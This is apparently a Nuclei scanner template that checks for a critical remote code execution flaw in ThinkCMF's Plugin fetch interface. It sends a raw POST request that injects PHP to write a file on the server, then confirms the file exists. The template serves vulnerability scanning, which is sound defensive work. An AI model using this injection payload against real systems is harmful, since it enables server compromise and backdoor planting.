id: thinkcmf-plugin-fetch-rce

info:
  name: ThinkCMF Plugin fetch 接口远程代码执行漏洞
  author: bl
  severity: critical
  description: |
    ThinkCMF 的 Plugin fetch 接口存在远程代码执行漏洞。攻击者可借助模板参数注入 PHP 代码，进而实现服务器上的任意文件创建与执行，构成严重安全风险。
  reference:
    - https://github.com/Mr-xn/Penetration_Testing_POC/blob/5162375b6621d20063d74edb50b8b4e8a12832ee/web/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C.md?plain=1#L36
  impact: |
    Successful exploitation allows attackers to execute arbitrary PHP code on the target server. This can lead to full system compromise, data theft, and persistent backdoor access.
  remediation: |
    Restrict access to plugin rendering interfaces, validate and sanitize template input, and disable dangerous PHP functions such as file write and dynamic execution in production environments.
  tags: ThinkCMF
  
variables:
  r1: "{{rand_base(4)}}"
  r2: "{{rand_base(20)}}"

http:
  - raw:
      - |
        POST /index.php?g=Api&m=Plugin&a=fetch HTTP/1.1
        Content-Type: application/x-www-form-urlencoded

        templateFile=/../../../public/index&prefix=''&content=<php>file_put_contents("{{r1}}.php",'<?php echo "{{r2}}"; unlink(__FILE__); ?>')</php>
    matchers:
      - type: status
        status:
          - 200
        internal: true
  - method: GET
    path:
      - "/{{r1}}.php"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{r2}}"
      - type: status
        status:
          - 200
